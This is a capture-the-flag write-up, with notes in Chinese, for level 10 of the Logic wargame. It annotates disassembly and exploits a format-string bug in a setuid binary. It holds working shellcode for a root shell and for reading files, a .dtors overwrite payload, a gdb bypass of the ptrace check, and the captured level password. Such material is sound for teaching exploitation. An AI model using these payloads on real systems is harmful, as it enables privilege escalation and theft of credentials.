liblevel10.h:
        int meep(char* x);

level10_hard:
0804865c <main>:
 804865c:       55                      push   %ebp
 804865d:       89 e5                   mov    %esp,%ebp
 804865f:       53                      push   %ebx
 8048660:       81 ec 64 04 00 00       sub    $0x464,%esp
 8048666:       83 e4 f0                and    $0xfffffff0,%esp
 8048669:       b8 00 00 00 00          mov    $0x0,%eax
 804866e:       83 c0 0f                add    $0xf,%eax
 8048671:       83 c0 0f                add    $0xf,%eax
 8048674:       c1 e8 04                shr    $0x4,%eax
 8048677:       c1 e0 04                shl    $0x4,%eax   /* eax = 16 */
 804867a:       29 c4                   sub    %eax,%esp
 804867c:       83 7d 08 01             cmpl   $0x1,0x8(%ebp) /* 比较argc是否大于1, 小于等于1则退出*/
 8048680:       7f 24                   jg     80486a6 <main+0x4a> 
 8048682:       83 ec 08                sub    $0x8,%esp
 8048685:       68 88 89 04 08          push   $0x8048988
 804868a:       68 8e 89 04 08          push   $0x804898e
 804868f:       e8 ec fe ff ff          call   8048580 <printf@plt>
 8048694:       83 c4 10                add    $0x10,%esp
 8048697:       c7 85 9c fb ff ff 01    movl   $0x1,0xfffffb9c(%ebp) /* ebp - 0x464 == 1*/
 804869e:       00 00 00
 80486a1:       e9 0d 02 00 00          jmp    80488b3 <main+0x257>
 80486a6:       83 ec 04                sub    $0x4,%esp  
 80486a9:       68 00 04 00 00          push   $0x400          /* */
 80486ae:       8b 45 0c                mov    0xc(%ebp),%eax  /*ebp + 0xc = argv*/
 80486b1:       83 c0 04                add    $0x4,%eax      /* eax = argv[1]的地址*/
 80486b4:       ff 30                   pushl  (%eax)
 80486b6:       8d 85 f8 fb ff ff       lea    0xfffffbf8(%ebp),%eax
 80486bc:       50                      push   %eax
 80486bd:       e8 4e fe ff ff          call   8048510 <strncpy@plt> /*strncpy(dest,argv[1], 0x400) */
 80486c2:       83 c4 10                add    $0x10,%esp
 80486c5:       6a 00                   push   $0x0
 80486c7:       6a 01                   push   $0x1
 80486c9:       6a 00                   push   $0x0
 80486cb:       6a 00                   push   $0x0
 80486cd:       e8 2e fe ff ff          call   8048500 <ptrace@plt> /* ptrace(0,0,1,0) == ptrace(PTRACE_TRACEME,  0, 1, 0)*/
 80486d2:       83 c4 10                add    $0x10,%esp
 80486d5:       85 c0                   test   %eax,%eax
 80486d7:       0f 89 94 00 00 00       jns    8048771 <main+0x115> /*若eax==0,则跳转*/
 80486dd:       a1 92 89 04 08          mov    0x8048992,%eax    /* eax保存"SYN"字符串地址 */
 80486e2:       8b 15 96 89 04 08       mov    0x8048996,%edx    /* 空字符串地址: "" */
 80486e8:       89 85 f0 fb ff ff       mov    %eax,0xfffffbf0(%ebp) /* 0xfffffbf0(%ebp) = ebp - 0x410 */
 80486ee:       89 95 f4 fb ff ff       mov    %edx,0xfffffbf4(%ebp) /* 0xfffffbf4(%ebp) = ebp - 0x40c */
 80486f4:       a1 9a 89 04 08          mov    0x804899a,%eax   /* "SYNACK"地址 */
 80486f9:       8b 15 9e 89 04 08       mov    0x804899e,%edx   /*  "CK"地址 */
 80486ff:       89 85 e8 fb ff ff       mov    %eax,0xfffffbe8(%ebp) /* 0xfffffbe8(%ebp) = ebp - 0x418 */
 8048705:       89 95 ec fb ff ff       mov    %edx,0xfffffbec(%ebp) /* 0xfffffbec(%ebp) = ebp - 0x414 */
 804870b:       80 bd f0 fb ff ff 00    cmpb   $0x0,0xfffffbf0(%ebp)
 8048712:       75 0e                   jne    8048722 <main+0xc6> 
 8048714:       80 bd e8 fb ff ff 00    cmpb   $0x0,0xfffffbe8(%ebp)
 804871b:       75 05                   jne    8048722 <main+0xc6>
 804871d:       e9 91 01 00 00          jmp    80488b3 <main+0x257>
 8048722:       83 ec 08                sub    $0x8,%esp
 8048725:       68 a4 89 04 08          push   $0x80489a4      /* "Tell Your Friends About Logic!\n" */
 804872a:       68 c4 89 04 08          push   $0x80489c4      /* "%s" */
 804872f:       e8 4c fe ff ff          call   8048580 <printf@plt>
 8048734:       83 c4 10                add    $0x10,%esp
 8048737:       83 ec 04                sub    $0x4,%esp
 804873a:       68 00 04 00 00          push   $0x400
 804873f:       8d 85 f8 fb ff ff       lea    0xfffffbf8(%ebp),%eax  /* dest */
 8048745:       50                      push   %eax
 8048746:       8d 85 a8 fb ff ff       lea    0xfffffba8(%ebp),%eax  /* dest_1 */
 804874c:       50                      push   %eax
 804874d:       e8 be fd ff ff          call   8048510 <strncpy@plt>  /* strncpy(dest_1, dest, 0x400) */
 8048752:       83 c4 10                add    $0x10,%esp
 8048755:       83 ec 08                sub    $0x8,%esp
 8048758:       8d 85 a8 fb ff ff       lea    0xfffffba8(%ebp),%eax
 804875e:       50                      push   %eax
 804875f:       68 c4 89 04 08          push   $0x80489c4
 8048764:       e8 17 fe ff ff          call   8048580 <printf@plt>  /* printf(dest_1) */
 8048769:       83 c4 10                add    $0x10,%esp
 804876c:       e9 42 01 00 00          jmp    80488b3 <main+0x257>

 8048771:       a1 9a 89 04 08          mov    0x804899a,%eax /* ptrace返回0则调到这里 , eax = "SYNACK"地址 */
 8048776:       8b 15 9e 89 04 08       mov    0x804899e,%edx /* edx = "CK"地址 */
 804877c:       89 85 e8 fb ff ff       mov    %eax,0xfffffbe8(%ebp)
 8048782:       89 95 ec fb ff ff       mov    %edx,0xfffffbec(%ebp)
 8048788:       a1 92 89 04 08          mov    0x8048992,%eax   /* eax = "SYN"地址 */
 804878d:       8b 15 96 89 04 08       mov    0x8048996,%edx   /* edx = ""地址 */
 8048793:       89 85 f0 fb ff ff       mov    %eax,0xfffffbf0(%ebp)
 8048799:       89 95 f4 fb ff ff       mov    %edx,0xfffffbf4(%ebp)
 804879f:       8d 85 e8 fb ff ff       lea    0xfffffbe8(%ebp),%eax
 80487a5:       83 ec 0c                sub    $0xc,%esp
 80487a8:       50                      push   %eax
 80487a9:       e8 b2 fd ff ff          call   8048560 <strlen@plt> /* strlen("SYNACK") ：0x804899a */
 80487ae:       83 c4 10                add    $0x10,%esp
 80487b1:       89 c3                   mov    %eax,%ebx   /*ebx = eax = 6 */
 80487b3:       8d 85 f0 fb ff ff       lea    0xfffffbf0(%ebp),%eax
 80487b9:       83 ec 0c                sub    $0xc,%esp
 80487bc:       50                      push   %eax
 80487bd:       e8 9e fd ff ff          call   8048560 <strlen@plt> /* strlen("SYN") ： 0x8048992 */
 80487c2:       83 c4 10                add    $0x10,%esp
 80487c5:       39 c3                   cmp    %eax,%ebx       /*比较0x804899a与0x8048992字符串的长度 */
 80487c7:       0f 85 bf 00 00 00       jne    804888c <main+0x230>
 80487cd:       c7 85 a4 fb ff ff 00    movl   $0x0,0xfffffba4(%ebp) /* 0xfffffba4(%ebp) = 0 */
 80487d4:       00 00 00
 80487d7:       a0 c7 89 04 08          mov    0x80489c7,%al
 80487dc:       88 85 a3 fb ff ff       mov    %al,0xfffffba3(%ebp) /* eax = 0*/
 80487e2:       83 ec 04                sub    $0x4,%esp
 80487e5:       83 ec 0c                sub    $0xc,%esp
 80487e8:       e8 b3 fd ff ff          call   80485a0 <geteuid@plt>
 80487ed:       83 c4 0c                add    $0xc,%esp
 80487f0:       50                      push   %eax
 80487f1:       83 ec 08                sub    $0x8,%esp
 80487f4:       e8 a7 fd ff ff          call   80485a0 <geteuid@plt>
 80487f9:       83 c4 08                add    $0x8,%esp
 80487fc:       50                      push   %eax
 80487fd:       83 ec 04                sub    $0x4,%esp
 8048800:       e8 9b fd ff ff          call   80485a0 <geteuid@plt>
 8048805:       83 c4 04                add    $0x4,%esp
 8048808:       50                      push   %eax
 8048809:       e8 32 fd ff ff          call   8048540 <setresuid@plt>
 804880e:       83 c4 10                add    $0x10,%esp
 8048811:       83 ec 08                sub    $0x8,%esp
 8048814:       68 c8 89 04 08          push   $0x80489c8
 8048819:       68 ca 89 04 08          push   $0x80489ca
 804881e:       e8 4d fd ff ff          call   8048570 <fopen@plt>  /* FILE* file = fopen("/home/level12/.pass","r")*/
 8048823:       83 c4 10                add    $0x10,%esp
 8048826:       89 85 a4 fb ff ff       mov    %eax,0xfffffba4(%ebp)
 804882c:       ff b5 a4 fb ff ff       pushl  0xfffffba4(%ebp)
 8048832:       6a 08                   push   $0x8
 8048834:       6a 01                   push   $0x1
 8048836:       8d 85 a3 fb ff ff       lea    0xfffffba3(%ebp),%eax /* */
 804883c:       50                      push   %eax
 804883d:       e8 4e fd ff ff          call   8048590 <fread@plt> /* fread(0xfffffba3(%ebp), 0x1, 0x8) */
 8048842:       83 c4 10                add    $0x10,%esp
 8048845:       c6 84 05 a3 fb ff ff    movb   $0x0,0xfffffba3(%ebp,%eax,1) /* 写入字符串结尾的NULL字符 */
 804884c:       00
 804884d:       83 ec 08                sub    $0x8,%esp
 8048850:       68 e0 89 04 08          push   $0x80489e0 /* "%s\n" */
 8048855:       68 8e 89 04 08          push   $0x804898e /* "Break it down now, bum, bum-dumb, bum bum bum BUM!!" */
 804885a:       e8 21 fd ff ff          call   8048580 <printf@plt>
 804885f:       83 c4 10                add    $0x10,%esp
 8048862:       83 ec 08                sub    $0x8,%esp
 8048865:       8d 85 a3 fb ff ff       lea    0xfffffba3(%ebp),%eax
 804886b:       50                      push   %eax
 804886c:       68 8e 89 04 08          push   $0x804898e
 8048871:       e8 0a fd ff ff          call   8048580 <printf@plt> /* 打印fread读取的内容 */
 8048876:       83 c4 10                add    $0x10,%esp
 8048879:       83 ec 0c                sub    $0xc,%esp
 804887c:       ff b5 a4 fb ff ff       pushl  0xfffffba4(%ebp)
 8048882:       e8 c9 fc ff ff          call   8048550 <fclose@plt>
 8048887:       83 c4 10                add    $0x10,%esp
 804888a:       eb 27                   jmp    80488b3 <main+0x257>

 804888c:       83 ec 0c                sub    $0xc,%esp
 804888f:       8d 85 f8 fb ff ff       lea    0xfffffbf8(%ebp),%eax
 8048895:       50                      push   %eax
 8048896:       e8 85 fc ff ff          call   8048520 <meep@plt>
 804889b:       83 c4 10                add    $0x10,%esp
 804889e:       83 ec 08                sub    $0x8,%esp
 80488a1:       68 14 8a 04 08          push   $0x8048a14
 80488a6:       68 8e 89 04 08          push   $0x804898e
 80488ab:       e8 d0 fc ff ff          call   8048580 <printf@plt>
 80488b0:       83 c4 10                add    $0x10,%esp
 80488b3:       8b 85 9c fb ff ff       mov    0xfffffb9c(%ebp),%eax  /* */
 80488b9:       8b 5d fc                mov    0xfffffffc(%ebp),%ebx
 80488bc:       c9                      leave
 80488bd:       c3                      ret
 80488be:       90                      nop
 80488bf:       90                      nop



 (gdb) disass meep
Dump of assembler code for function meep:
0x0026846c <meep+0>:    push   %ebp
0x0026846d <meep+1>:    mov    %esp,%ebp
0x0026846f <meep+3>:    push   %ebx
0x00268470 <meep+4>:    sub    $0x84,%esp
0x00268476 <meep+10>:   call   0x26847b <meep+15>
0x0026847b <meep+15>:   pop    %ebx
0x0026847c <meep+16>:   add    $0x119d,%ebx
0x00268482 <meep+22>:   sub    $0x4,%esp
0x00268485 <meep+25>:   sub    $0xc,%esp
0x00268488 <meep+28>:   call   0x26839c <geteuid@plt>
0x0026848d <meep+33>:   add    $0xc,%esp
0x00268490 <meep+36>:   push   %eax
0x00268491 <meep+37>:   sub    $0x8,%esp
0x00268494 <meep+40>:   call   0x26839c <geteuid@plt>
0x00268499 <meep+45>:   add    $0x8,%esp
0x0026849c <meep+48>:   push   %eax
0x0026849d <meep+49>:   sub    $0x4,%esp
0x002684a0 <meep+52>:   call   0x26839c <geteuid@plt>
0x002684a5 <meep+57>:   add    $0x4,%esp
0x002684a8 <meep+60>:   push   %eax
0x002684a9 <meep+61>:   call   0x26836c <setresuid@plt>
0x002684ae <meep+66>:   add    $0x10,%esp
0x002684b1 <meep+69>:   sub    $0x4,%esp
0x002684b4 <meep+72>:   push   $0x80   
0x002684b9 <meep+77>:   pushl  0x8(%ebp)
0x002684bc <meep+80>:   lea    -0x88(%ebp),%eax
0x002684c2 <meep+86>:   push   %eax                    /*        0xbfffd190, 0xbfffd2a0, 0x80 */
0x002684c3 <meep+87>:   call   0x26835c <strncpy@plt> /* strncpy(dest3,argv[1],0x80) */
0x002684c8 <meep+92>:   add    $0x10,%esp
0x002684cb <meep+95>:   sub    $0xc,%esp
0x002684ce <meep+98>:   lea    -0x88(%ebp),%eax
0x002684d4 <meep+104>:  push   %eax
0x002684d5 <meep+105>:  call   0x26837c <printf@plt> /* printf(dest3): 字符串格式化漏洞 */
0x002684da <meep+110>:  add    $0x10,%esp
0x002684dd <meep+113>:  mov    $0x0,%eax
0x002684e2 <meep+118>:  mov    -0x4(%ebp),%ebx
0x002684e5 <meep+121>:  leave  
0x002684e6 <meep+122>:  ret    
End of assembler dump.
(gdb) 



在meep函数中，有一个字符串格式化漏洞    
<meep+105>:  call   0x26837c <printf@plt> /* printf(dest3): 字符串格式化漏洞 */ 

(gdb) r $(perl -e 'print "AAAA"."[%08x]"x(100)') 
(gdb) c
Continuing.

Breakpoint 1, 0x080486cd in main ()
0x080486cd <main+113>:   e8 2e fe ff ff call   0x8048500 <ptrace@plt>
(gdb) ni 
0x080486d2 in main ()
0x080486d2 <main+118>:   83 c4 10       add    $0x10,%esp
(gdb) set $eax=0
(gdb) c
Continuing.
AAAA[bfffd440][00000080][00e0847b][41414141][3830255b][255b5d78][5d783830][3830255b][255b5d78][5d783830][3830255b][255b5d78][5d783830][3830255b][255b5d78][5d783830][3830255b][255b5d78][5d783830][3830255b][%08n! Thanks For Playing!

好，offset=4
[level10@logic level10]$ export PAYLOAD=$'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80'
[level10@logic level10]$ ./getenv012345 PAYLOAD
PAYLOAD is at 0xbfffdfa4
[level10@logic level10]$ ./getenv012345 PAYLOAD
PAYLOAD is at 0xbfffdfa4
[level10@logic level10]$ 

[level10@logic level10]$ objdump -s -j .dtors level10_hard

level10_hard:     file format elf32-i386

Contents of section .dtors:
 8049a3c ffffffff 00000000 

[addr+2]
\x08\x04\x9a\x42
[addr]
\x08\x04\x9a\x40

HOB: 0xbfff  LOB: 0xdfa4
%.[HOB-8]x
%.49143x  

%[offset]$hn
%4\$hn

%.[LOB-HOB]x
%.8101x

%[offset + 1]$hn
%.5\$hn


$(python -c "print '\x42\x9a\x04\x08\x40\x9a\x04\x08'+'%.49143x%4\$hn%.8101x%5\$hn'")   

上面用execv("/bin/sh")的方式打开了shell，但是在后台运行，下面使用一个读取文件的shellcode
[level10@logic level10]$ export READ=$'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/level10/.pass'
[level10@logic level10]$ ./getenv012345 READ
READ is at 0xbfffdf72

HOB: 0xbfff LOB: 0xdf72
$(python -c "print '\x42\x9a\x04\x08\x40\x9a\x04\x08'+'%.49143x%4\$hn%.8051x%5\$hn'")

经过测试，成功读出了/home/level10/.pass内容
将文件名改为/home/level11/.pass后测试：
[level10@logic level10]$ ./level10_hard $(python -c "print '\x42\x9a\x04\x08\x40\x9a\x04\x08'+'%.49143x%4\$hn%.8051x%5\$hn'")
B0000000000000000000000000000000000000000000000000000000000000000000000000000000000000
........5fWin! Thanks For Playing!
iDj48s1u
[level10@logic level10]$

至此logic通关

CONGRATS! You have successfully finished the Logic Wargame! If you have
not all ready done so, you should come to IRC and say hello to everyone.
We would very much enjoy being able to speak with you and hear any
feedback that you have about our game! Ontop of that you will also now
receive permanent auto-voice in our IRC channel, as a representation of
your hardwork and dedication!

We also encourage you to consider designing and submitting your own level
designs to us to be included in this Wargame. We are always looking for
new contributions and especially enjoy when it comes from our own players.

If you are interested in this please contact us on IRC:
   * irc.smashthestack.org
   * #logic

Thank you for being a part of our community 
